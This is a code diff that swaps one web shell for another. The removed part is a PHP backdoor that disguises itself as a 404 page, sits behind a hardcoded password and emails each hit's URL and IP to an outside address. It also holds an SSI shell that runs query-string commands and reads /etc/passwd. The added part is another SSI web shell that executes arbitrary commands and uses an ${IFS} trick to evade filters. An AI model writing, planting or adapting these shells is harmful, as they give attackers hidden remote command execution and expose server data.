@@ -1,170 +1,53 @@
-<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$sendmail = 'helloroot1337@proton.me';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$massage_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($sendmail, "LOGGER", $massage_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
-<?php
-error_reporting(0);
-ini_set('max_execution_time', 0);
-session_start();
-$name = "atomic";
-function login()
-{
-$random_url = mt_rand(1000000, 247345736453);
-$curl = curl_init();
-$protocol = 'http://';
-if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
-        $protocol = 'https://';
-    }
-    curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
-    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-    $server_404 = curl_exec($curl);
-    $server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
-    $server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
-    echo $server_404;
-    exit;
-}
-if (!isset($_SESSION[md5($sexy)])) {
-    if (isset($_GET[$name]) && $_GET[$name] == $name) {
-        $_SESSION[md5($sexy)] = true;
-    } else {
-        login();
-    }
-}
 
-error_reporting(0);
-header('HTTP/1.0 404 Not Found', true, 404);
-session_start();
-$pass = "root";
-if($_POST['password'] == $pass) {
-  $_SESSION['forbidden'] = $pass;
-}
-if($_GET['page'] == "blank") {
-  echo "<a href='?'>Back</a>";
-  exit();
-}
-if(isset($_REQUEST['logout'])) {
-  session_destroy();
-  echo "<script>window.location=''</script>";
-}
-if(!($_SESSION['forbidden'])) {
-?>
-<title>404 Not Found</title>
-<link rel="icon"https://1.top4top.net/p_14405v3810.jpg"><meta name="theme-color" content="black">
-<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
-<html><head><title>404 Not Found</title></head>
-<style> 
-input { margin:0;background-color:#fff;border:1px solid #fff; } 
-</style> 
-<body>
-<h1>Not Found</h1>
-<p>The requested URL  was not found on this server.</p><hr>
-<form method=post>
-<input type="password" name="password"></form></body></html>
-      
-      <br>
-      <br>
-      <?php echo $_SESSION['forbidden']; ?>
-    </form>
-  </td>
-</table>
-<?php
-exit();
-}
-?>
-<!--#config errmsg="[Error in shell]"-->
+<!--#config errmsg="Error / Webnya Ga Support SSI Command"-->
 <!--#set var="zero" value="" -->
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="ls -al" -->
+<!--#set var="shl" value="whoami" -->
 <!--#else -->
 <!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
-<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="inc" value="/../../../../../../../etc/passwd" -->
-<!--#else -->
-<!--#set var="inc" value=$QUERY_STRING_UNESCAPED -->
-<!--#endif -->
 <html>
 <head>
-<title>
-SSI Shell
-</title>
-<script language="javascript">
-function fex()
-{
-document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+document.getElementById('command').value;
-}
-function vfile()
-{
-document.location.href="<!--#echo var=DOCUMENT_NAME -->?cat "+document.getElementById('vfile').value;
-}
-</script>
+<title>SSI Webshell</title>
+<meta name="theme-color" content="#000">
+<meta name="Author" content="Unknown45">
+<meta name="description" content="Security ? that just an illusion - ">
+<meta property="og:description" content="Security ? that just an illusion - ">
 </head>
-<body bgcolor=#e4e0d8 alink=blue vlink=blue>
-<div align=center width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+2><a href=http://github.com/Anon-Exploiter>SSI Shell</a></font></b></center>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Shell info</font></b></center>
-<br>
-<b><font color=blue>GMT date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_GMT --></b><br>
-<b><font color=blue>Local date</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DATE_LOCAL --></b><br>
-<b><font color=blue>Document name</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_NAME --></b><br>
-<b><font color=blue>Document URI</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=DOCUMENT_URI --></b><br>
-<b><font color=blue>Last modified</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=LAST_MODIFIED --></b><br>
-<b><font color=blue>Owner</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=USER_NAME --></b><br>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Server info</font></b></center>
-<br>
-<pre>
-<!--#printenv-->
-</pre>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Command for shell & address for inclusion</font></b></center>
-<br>
-<b><font color=blue>Enter command/address</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=command>&nbsp;<input type=button value=Run onclick=fex();>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Shell</font></b></center>
-<br>
-<b><font color=blue>Executed command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br>
-<textarea bgcolor=#e4e0d8 cols=121 rows=15>
-<!--#exec cmd=$shl -->
-</textarea>
-<br>
-</div>
-<br>
-<div align=left width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1>Operations on files</font></b></center>
-<br>
-<b><font color=blue>View file (cat)</font></b>:&nbsp;&nbsp;&nbsp;<input type=text size=80 id=vfile value=<!--#echo var=SCRIPT_FILENAME -->>&nbsp;<input type=button value=Run onclick=vfile();><br>
-<b><font color=blue>Included file</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>
-<textarea bgcolor=#e4e0d8 cols=121 rows=15>
-<!--#include virtual=$inc -->
-</textarea>
-<br>
-</div>
-<br>
-<div align=center width=100% border=0 style=background-color:#D4D0C8;>
-<center><b><font size=+1><a href=http://github.com/Anon-Exploiter>(c) :V ( :3 )</a></font></b><br><small>2009, v1.02<!--êîïèðàéò ïîìåíÿí â 2011 ;) --></small><br>
-ONLY FOR EDUCATIONAL PURPOSES. ILLEGAL ACTIVITIES PROHIBITED.
-</center>
-</div>
-</body>
-</html>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
+<script language="javascript">
 
+function unknown45()
+{
+	var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep)+"&&test";
+}
+
+
+</script>
+<style type="text/css">
+	.input {
+		background: transparent;
+		border-color: #ffffff;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+	}
+
+	button {
+		cursor: pointer;
+	}
+</style>
+
+</head>
+<body onload="checkaja()">
+<font face=courier size=2><i><center>SSI Webshell by Unknown45<hr><font face="courier" size=2>
+<font size=2>Command : <input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;"> <button class="input" id="gas" onclick="unknown45();">Execute</button></center>
+<hr></i>
+Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl --></font></b><br>
+<textarea bgcolor=#e4e0d8 cols=121 rows=15 style="width: 100%">
+<!--#exec cmd=$shl -->
